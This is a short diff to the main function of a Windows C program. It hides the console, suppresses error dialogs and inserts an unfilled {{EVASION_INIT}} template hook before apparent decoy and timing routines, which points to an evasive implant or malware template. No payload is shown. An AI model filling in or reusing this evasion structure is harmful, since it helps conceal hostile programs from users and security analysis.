@@ -15,6 +15,7 @@ int main(int argc, char *argv[]) {
     FreeConsole();
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
 
+{{EVASION_INIT}}
     decoy_work();
     pace(300, 300);
 
